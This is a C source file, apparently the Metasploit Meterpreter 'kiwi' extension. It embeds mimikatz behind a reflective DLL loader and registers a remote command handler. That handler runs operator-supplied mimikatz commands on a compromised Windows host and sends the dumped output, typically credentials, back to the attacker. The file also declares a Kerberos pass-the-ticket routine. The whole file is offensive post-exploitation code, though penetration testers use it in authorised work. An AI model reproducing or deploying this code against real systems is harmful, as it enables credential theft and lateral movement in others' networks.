/*!
 * @file main.c
 * @brief Entry point for the kiwi extension.
 */

#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

#include "main.h"

extern __declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPWSTR input);
extern DWORD kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize);
extern LONG mimikatz_initOrClean(BOOL Init);

DWORD request_exec_cmd(Remote *remote, Packet *packet);
DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet);

/*! @brief The enabled commands for this extension. */
Command customCommands[] =
{
    COMMAND_REQ("kiwi_exec_cmd", request_exec_cmd),
    COMMAND_TERMINATOR
};

/*!
 * @brief Handler for the generic command execution function.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_exec_cmd(Remote *remote, Packet *packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet * response = packet_create_response(packet);

	wchar_t* cmd = packet_get_tlv_value_wstring(packet, TLV_TYPE_KIWI_CMD);
	if (cmd != NULL)
	{
		dprintf("[KIWI] Executing command: %S", cmd);

		// While this implies that powershell is in use, this is just a naming thing,
		// it's not actually using powershell.
		wchar_t* output = powershell_reflective_mimikatz(cmd);
		if (output != NULL)
		{
			packet_add_tlv_wstring(response, TLV_TYPE_KIWI_CMD_RESULT, output);
		}
		else
		{
			result = ERROR_OUTOFMEMORY;
		}
		free(cmd);
	}
	else
	{
		result = ERROR_INVALID_PARAMETER;
	}

	dprintf("[KIWI] Dumped, transmitting response.");
	packet_transmit_response(result, remote, response);
	dprintf("[KIWI] Done.");

	return ERROR_SUCCESS;
}

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	dprintf("[KIWI] Init server extension - initorclean");
	mimikatz_initOrClean(TRUE);

	dprintf("[KIWI] Init server extension - register");
	command_register_all(customCommands);

	dprintf("[KIWI] Init server extension - done");

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	mimikatz_initOrClean(FALSE);
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "kiwi", bufferSize - 1);
	return ERROR_SUCCESS;
}
